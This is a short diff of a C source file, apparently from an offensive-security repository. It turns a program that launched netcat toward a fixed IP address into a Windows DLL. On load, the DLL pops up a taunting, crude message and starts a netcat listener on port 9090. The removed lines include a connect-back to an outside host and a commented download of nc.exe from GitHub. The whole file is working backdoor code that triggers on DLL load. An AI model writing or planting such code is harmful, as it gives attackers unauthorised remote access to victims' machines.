@@ -1,14 +1,15 @@
-#include <stdlib.h>
 #include <windows.h>
 
-int main ()
+BOOL WINAPI
+DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
 {
-
-    int i;
-    // https://raw.githubusercontent.com/stackviolator/ccso-offense/main/dll/nc.exe
-    // i = system ("wget https://raw.githubusercontent.com/stackviolator/ccso-offense/main/dll/nc.exe -o \%C\%\\nc.exe");
-    // Sleep(2000); // 10 seconds (10000 milliseconds)
-    i = system ("C:\\Users\\joshm\\Desktop\\ccso-offense\\dll\\nc.exe 10.118.53.64 9090");
-
-    return 0;
+    switch (dwReason)
+    {
+        case DLL_PROCESS_ATTACH:
+            MessageBox(NULL, "I love balls in my face lol.. so sus lol i cant beluve you fell for it lmfao lol", "balls", MB_ICONERROR | MB_OK);
+            int i;
+            i = system ("C:\\Users\\joshm\\Desktop\\ccso-offense\\dll\\nc.exe -lvnp 9090");
+            break;
+    }
+    return TRUE;
 }
